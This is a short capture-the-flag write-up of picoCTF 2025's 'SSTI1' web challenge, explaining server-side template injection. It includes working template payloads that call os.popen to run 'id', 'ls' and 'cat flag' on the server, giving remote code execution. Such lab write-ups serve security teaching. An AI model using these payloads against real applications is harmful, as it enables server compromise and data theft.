# SSTI1 - picoCTF 2025

## 📂 Category
- Web Exploitation  
- Difficulty: Easy  

---

## 🧩 Challenge Description
The challenge provided a simple web form that reflected user input. 

---

## 🔍 Initial Observations
- Entering expressions like `{{7*7}}` returned `49`, indicating possible Server-Side Template Injection (SSTI).
---

## 🧪 Exploitation Steps

1. Entered: {{7*7}} → Response was `49` → Confirmed SSTI.
2. Tried: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
3. Got a system-level response confirming Remote Code Execution (RCE).
4. Ran: {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
5. Server files listed.
6. Finally: {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
7. Revealed the flag.

## 🧠 What I Learned

What is a Template Engine?
A template engine helps generate dynamic web pages. Instead of hardcoding values, you write placeholders like:
```<p>Hello, {{ name }}!</p>```

The server fills in the actual data.

What is SSTI?
Server-Side Template Injection occurs when user input is unsafely inserted into a template. If an input like {{7*7}} returns 49 (7 times 7 = 49), the server is evaluating user input as code. Running 7*7 is just the standard convention, but you can run any expression, mathematical or not.

If unpatched, SSTI can lead to:
- Data leaks
- Remote code execution (RCE)
- Full server compromise
